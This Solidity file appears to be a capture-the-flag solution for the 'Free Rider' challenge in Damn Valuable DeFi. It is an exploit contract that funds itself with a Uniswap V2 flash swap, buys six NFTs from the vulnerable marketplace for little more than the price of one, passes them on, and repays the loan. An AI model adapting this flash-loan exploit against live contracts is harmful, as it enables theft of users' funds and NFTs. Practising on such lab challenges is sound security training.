// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../UniswapV2/IUniswapV2Callee.sol";
import "../../UniswapV2/IUniswapV2Pair.sol";
import "../../WETH9.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract BountyHunter is IUniswapV2Callee {
    WETH9 immutable weth;
    FreeRiderNFTMarketplace immutable marketplace;
    FreeRiderRecovery immutable recovery;
    DamnValuableNFT immutable nft;
    IUniswapV2Pair immutable pair;

    constructor(
        WETH9 _weth,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecovery _recovery,
        DamnValuableNFT _nft,
        IUniswapV2Pair _pair
    ) {
        weth = _weth;
        marketplace = _marketplace;
        recovery = _recovery;
        nft = _nft;
        pair = _pair;
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function uniswapV2Call(
        address sender,
        uint256,
        uint256 amount1,
        bytes calldata
    ) external {
        weth.withdraw(amount1);

        uint256 fee = (amount1 * 3) / 997 + 1;

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: 15 ether + 1}(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), sender, i, "0x");
        }

        weth.deposit{value: amount1 + fee}();
        weth.transfer(msg.sender, amount1 + fee);
    }

    receive() external payable {}
}
